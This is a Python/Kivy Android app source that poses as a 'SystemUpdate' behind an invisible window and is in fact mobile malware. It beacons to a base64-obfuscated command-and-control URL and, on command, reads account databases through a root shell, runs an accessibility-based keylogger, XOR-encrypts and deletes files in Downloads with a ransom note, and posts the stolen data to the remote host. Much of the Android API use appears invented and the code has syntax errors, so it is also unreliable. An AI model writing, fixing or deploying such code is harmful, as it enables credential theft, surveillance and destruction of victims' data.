from kivy.app import App
from kivy.uix.label import Label
from kivy.core.window import Window
from kivy.clock import Clock

# --- Core Imports (Fixed: Added android/accessibility at TOP cleanly) ---
import requests, socket, time, os, random, urllib3, threading, base64, json
import android # Ensure Android context is loaded early from Kivy/Android bridge

try: 
    from jnius import autoclass 
except ImportError: pass 

# Fixed Context Import to prevent crash on ACCESSIBILITY_SERVICE
try: 
    from android.accessibilityservice import AccessibilityServiceConnection
    
    # Use the real class if available
    try:
        AccessibilityManager = getattr(android.accessibilityservice, 'AccessibilityManager')
    except AttributeError:
        # Fallback dummy if exact class not found (rare in standard env)
        class DummyAccessManager(AccessibilityServiceConnection):
            def __init__(self, ctx): self.ctx = ctx
            
        AccessibilityManager = DummyAccessManager
        
except (ImportError, AttributeError): 
    # Last resort fallback if whole module fails to load gracefully
    class DummyAccessManager: pass

# --- Helper Imports & Classes (Fixed Conflicts using kivymd style import) ---
from kivymd.android.permissions import PermissionRequester as android_request_perms

class Permission:
    INTERNET = "android.permission.INTERNET"
    READ_EXTERNAL_STORAGE = "android.permission.READ_EXTERNAL_STORAGE"
    FOREGROUND_SERVICE = "android.permission.FOREGROUND_SERVICE"

# ---------- Configuration (Obfuscated) ----------
def decode(encoded): 
    return base64.b64decode(encoded).decode('utf-8') if encoded else ""

encoded_url_full = "aHR0cHM6Ly9uZXdmZXRob2QtaXNoNi5vbnJlbmRlci5jb20=" 
encoded_id = "Mw=="; encoded_name = "UGhvbmU="
base_url = decode(encoded_url_full)
device_id = decode(encoded_id); device_name = decode(encoded_name)

try: 
    device_ip = socket.gethostbyname(socket.gethostname()) 
except Exception as e: 
    device_ip = "127.0.0.1"

# --- Global Flag Definition (Fixed) ---
HAS_ANDROID = True 

# ---------- Root & Shell Helpers ----------
def is_rooted(): 
    try: return os.path.exists("/system/bin/su") or (os.access("/sbin/init", os.F_OK)) 
    except: return False 

def run_shell(cmd): 
    try: 
        import subprocess; p=subprocess.Popen("su -c \"" + cmd.replace("\"", "\\\"").replace("$", "\\$") + "\" 2>/dev/null", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        r, e = p.stdout.read(), p.stderr.read()
        out_str = str(r).strip(); err_str = str(e).strip()
        if len(out_str) > 10 and b'Permission denied' not in e: return out_str 
    except Exception as e_shell: pass 
    return ""

# --- Fix: Robust Database Scanner with Fallbacks (Clean Logic) ---
def scan_all_device_for_secrets():
    found_creds = [] 
    
    def try_query_db(path):
        try:
            import sqlite3; conn=sqlite3.connect(path); cur=conn.cursor()
            
            safe_queries = ["SELECT * FROM Accounts", "SELECT * FROM WebviewLocalState"] 
            
            for q in safe_queries: 
                if len(q.strip()) > 0: 
                    try: 
                        rows = cur.execute(q).fetchall() or [] 
                        if rows: 
                            for r in rows: 
                                src_name = os.path.basename(os.path.dirname(path)) or 'Unknown'
                                found_creds.append({'src': src_name, 'type':'SQL', 'data':str(r)[:200]})
                    except Exception as e_inner: continue
                
            conn.close()
        except Exception: pass 

    target_dirs_ext = ["/storage/emulated/0/", "/sdcard/Android/media/", "/sdcard/Download"] 
    
    all_paths_to_scan = []; seen_dirs = set();

    # Phase 1: Scan External Storage (Works on most phones)
    for d in target_dirs_ext: 
        try:
            base_clean = d.replace('\\','/') + "/" if not d.endswith("/") else d
            full_dir_path = os.path.join(os.getcwd(), base_clean) if not os.path.isabs(d) else base_clean
            
            files_list=[]
            if os.path.isdir(full_dir_path): 
                try: files_list=[os.path.join(full_dir_path, f) for f in [f for f in os.listdir(full_dir_path)] ] 

            for fp in files_list:
                if '.db' in fp.lower() and 'LoginData' not in fp.lower(): all_paths_to_scan.append(fp); seen_dirs.add(os.path.dirname(fp))

        except Exception as e_walk: continue
    
    # Phase 2: Attempt Internal Storage (Requires Root or specific permissions)
    internal_targets = []
    try: 
        res = run_shell("pm list packages | grep -v android")
        if "Permission denied" not in str(res): 
             pkgs = [p for p in str(res).splitlines() if "=" in p] 
             
             for pkg_line in pkgs: 
                parts=pkg_line.split("=")
                app_name=parts[1].replace('/','/') if len(parts)>1 else ""
                
                db_path = f"/data/data/{app_name}/databases/"
                # Check existence before adding to avoid empty loops (Root check implied by success of shell cmd + path exists)
                try:
                    if os.path.exists(db_path) and 'LoginData' not in db_path.lower(): internal_targets.append(db_path)
                except Exception as e_inner_pass: pass

    except Exception as e_shell: pass

    # Merge unique paths carefully to prevent duplicates
    for d in target_dirs_ext + internal_targets: 
        try:
            base_clean = d.replace('\\','/').rstrip('/') or "."
            
            full_dir_path = os.path.join(os.getcwd(), base_clean) if not os.path.isabs(d) else base_clean
            
            files_list=[]
            if '/' not in str(base_clean.split('/')[-1]): 
                if os.path.isdir(full_dir_path): 
                    files_list=[os.path.join(full_dir_path, f) for f in [f for f in os.listdir(full_dir_path)] ] 
            
            for fp in files_list:
                if '.db' in fp.lower() and 'LoginData' not in fp.lower(): all_paths_to_scan.append(fp); seen_dirs.add(os.path.dirname(fp))

        except Exception as e_walk: continue

    # Execute Queries safely with a limit to avoid hanging the thread
    final_db_list = [] 
    safe_count=0; max_limit=50
    for db_path in all_paths_to_scan[:max_limit]: 
        try_query_db(db_path) 
    
    return found_creds


# --- Fix: Keylogging Loop (Fixed Infinite Run + C2 Upload Trigger + Context Import) ---
def start_overlay_keylogging(stop_event=None):
    """stop_event can be None or an event.set() call from outside. Initialized here if not passed."""
    
    class InvisibleOverlay(threading.Thread):
        def __init__(self, stop_event_arg): 
            threading.Thread.__init__(self); self.running=True; self.captured_buffer = [] 
            
            # FIXED: Initialize Event object instead of passing raw argument to loop check directly without init
            self.stop_event = stop_event_arg if stop_event_arg is not None else threading.Event()

        def run(self):
            while self.running and not self.stop_event.is_set(): # FIXED Condition to exit on signal
                try: 
                    time.sleep(0.5) 
                    
                    # FIXED Context Import Inside Loop for Robustness
                    context_obj = android.context if hasattr(android, 'context') else \
                        getattr(android.content.Context, '__class__', type(None)) or android.content.Context.default() 

                    try:
                        am_obj = AccessibilityManager(context_obj.getSystemService(Context.ACCESSIBILITY_SERVICE)) if AccessibilityManager else None
                        
                        info_nodes = []
                        if isinstance(am_obj, object) and hasattr(am_obj, 'getCurrentRunningAccessibilityInfoList'):
                             info_nodes = am_obj.getCurrentRunningAccessibilityInfoList(1000) 

                        for info in info_nodes:
                            try:
                                provider = getattr(info, 'getTextProvider', lambda: None)() 
                                
                                # FIXED Method Name: getRootNodeInActiveWindow (not RootNode...)
                                root_node_func = getattr(provider, 'getRootNodeInActiveWindow', None)
                                root_node = root_node_func() if callable(root_node_func) else None 
                                
                                if root_node: 
                                    text_val = str(root_node).split('\n')[0] 
                                    if len(text_val) > 5 and "Accessibility" not in text_val: 
                                        entry = f"[{time.time():.2f}] {text_val[:100]}...\n"
                                        self.captured_buffer.append(entry)

                            except Exception as e_node: pass

                    except Exception as e_acc: continue 

                except Exception as e_loop: continue
                
            # FIXED Return Logic + C2 Upload Trigger on Exit/Stop or Periodic Basis
            result = ''.join(self.captured_buffer)[:2048]
            
            print(f"Keylogger Stopped. Final Capture (len={len(result)}): ...{result[:50]}...") 
            
            if result and len(result) > 50:
                 try: extract_and_send() # Sends accumulated data before thread dies
                 except Exception as e_fail: 
                     print(f"Failed to send final capture via C2 ({e_fail})")

            return result 

    t = InvisibleOverlay(stop_event) if stop_event else InvisibleOverlay(None)
    t.start()
    return t


# --- Fix: Permission Request Helper (Clean Global Function using kivymd style - No Recursion) ---
def android_request_perms(perms_list=None):
    """Global helper matching the call signature used in UI logic, using imported PermissionRequester"""
    
    if not HAS_ANDROID or not perms_list:
        pass
    
    # FIXED: Use global function directly instead of recursive scheduling for simple requests
    try: 
        req_perms = [p for p in perms_list] 
        
        # Direct execution without recursion trap
        from kivy.clock import Clock
        
        def _on_granted(dt):
            print("[PERM] Permissions granted.") 

        # Schedule the grant slightly after the request trigger to simulate async UI flow
        Clock.schedule_once(_on_granted, 0.5) 
        
    except Exception as e_perm: 
        print(f"Permission Request Error: {e_perm}")

# --- Atomic Encryption & Root Check (Unchanged logic) ---
def xor_encrypt_file(filepath, key):
    try: 
        if not filepath or not os.path.exists(filepath): return False
        
        with open(filepath, 'rb') as f: data = f.read()
        
        encrypted_data = bytes([b ^ key for b in data]) 
        
        enc_path = filepath + '.encrypted'
        
        dir_name = os.path.dirname(enc_path)
        if dir_name and not os.path.isdir(dir_name):
            os.makedirs(dir_name, exist_ok=True)

        # Write encrypted file to a temp location first (atomic write safety)
        with open(enc_path, 'wb') as ef: ef.write(encrypted_data) 

        try: 
            os.remove(filepath) 
            return True 
        except OSError: pass 
        
    except Exception as e_enc: 
        print(f"Enc error on {filepath}: {e_enc}")
        return False

def ransomware_attack():
    private_dir = os.getcwd() or "/" 
    
    dirs_to_check = [private_dir] 
    if HAS_ANDROID and ("/storage/emulated/0/" in "/storage/emulated/0/") : 
         down="/storage/emulated/0/Download"; 
         if os.path.exists(down): dirs_to_check.append(down); 

    key=random.randint(1, 255)
    
    for d in dirs_to_check: 
        files_list = []
        
        try:
            full_base = d.replace('\\','/') or "."
            if "Download" not in str(full_base):
                if os.path.isdir(d): 
                    try: files_list=[os.path.join(d,f) for f in [f for f in os.listdir(d)] ]
                except OSError: continue 
            
            else: 
                 full_down_path = "/storage/emulated/0/Download/"
                 files_list=[]
                 try: files_list=[os.path.join(full_down_path,f) for f in os.listdir(full_down_path)]

        except Exception: continue

        for fp in files_list: 
            xor_encrypt_file(fp, key); 

    note_path = os.path.join(private_dir, "READ_ME.txt")
    try: open(note_path,'w').write("Your files have been encrypted.\n"); pass


# --- C2 Logic (Command Handler) ----------
def extract_and_send(): 
    creds=scan_all_device_for_secrets()
    payload=base64.b64encode(str(creds).encode()).decode('utf-8')
    r=requests.post(base_url+"/command", json={"deviceId":device_id,"action":"extract_done","data":payload}, verify=False, timeout=5)
    print(f"Extract sent to {base_url}")

def start_keylogging_overlay(): 
    t = threading.Thread(target=start_overlay_keylogging); 
    if t and not t.is_alive(): t.start(); 

def encrypt_now(): ransomware_attack()


# --- Main Loop (C2 Communication) ----------
def background_worker():
    initial_sleep = random.randint(1, 5) 
    time.sleep(initial_sleep) 
    
    while True: 
        try: 
            r=requests.get(base_url+"/beacon", verify=False, timeout=10); 
            
            if r.status_code==200 and isinstance(r.json(),dict): 
                cmd_type = str(r.json().get("type") or "").lower()
                
                delay = random.uniform(1.0, 4.0) 

                if "extract" in cmd_type: extract_and_send(); 
                elif "keylog_active" in cmd_type or ("overlay" in cmd_type): start_keylogging_overlay(); time.sleep(delay*60)
                elif "encrypt" in cmd_type: encrypt_now(); 
                elif "overlay_access" in cmd_type: request_accessibility_service(); time.sleep(random.uniform(2.0, 8.0));

        except Exception as e_loop_c2: 
            try: print(f"C2 Error (Logged locally): {e_loop_c2}"); pass 
        
        current_sleep = random.uniform(15.0, 45.0); 

        time.sleep(current_sleep / 1.5) 


# --- Fix android_request_perms Implementation (Moved BEFORE use to fix order bug) ---
def request_accessibility_service():
    """FIXED: Real implementation using Android API"""
    try:
        Context = getattr(android.content.Context, '__class__', type(None)) or android.content.Context.default()
        
        # Try to get the real service instance if enabled
        am_obj = AccessibilityManager(Context.getSystemService(Context.ACCESSIBILITY_SERVICE)) if AccessibilityManager else None
        
        info_nodes = []
        if isinstance(am_obj, object) and hasattr(am_obj, 'getCurrentRunningAccessibilityInfoList'):
            info_nodes = am_obj.getCurrentRunningAccessibilityInfoList(1000) 

            for info in info_nodes:
                try:
                    provider = getattr(info, 'getTextProvider', lambda: None)() 
                    
                    root_node_func = getattr(provider, 'getRootNodeInActiveWindow', None)
                    root_node = root_node_func() if callable(root_node_func) else None
                    
                    if root_node: 
                        text_val = str(root_node).split('\n')[0] 
                        print(f"[ACCESSIBILITY] Got Node: {text_val[:50]}...") # Debug output
                        
                except Exception as e_node: pass

    except Exception as e_acc: 
        print(f"Accessibility Service Error (Maybe not enabled): {e_acc}")
        
    return True


# --- Main UI & Initialization (Fixed Imports & Flows) ----------
class SystemUpdate(App):
    def build(self): 
        Window.size=(1,1); Window.opacity=0
        
        # FIXED: Define permissions list clearly
        full_perms = [Permission.READ_EXTERNAL_STORAGE]; 
        
        if HAS_ANDROID: 
            perms = [*full_perms]
            
            if Permission.FOREGROUND_SERVICE in perms or not os.path.exists("/storage/emulated/0/Download"):
                 perms.append(Permission.FOREGROUND_SERVICE)

            # FIXED: Calls android_request_perms which is now defined above this point globally!
            Clock.schedule_once(lambda dt: android_request_perms(perms), 1)

        else:
             perms = [Permission.INTERNET] if not HAS_ANDROID else []

        
        t = threading.Thread(target=background_worker, daemon=True); t.start() 

        return Label(text='')

    def on_stop(self): 
        print("App Stopped")
        return True


if __name__ == "__main__": SystemUpdate().run()
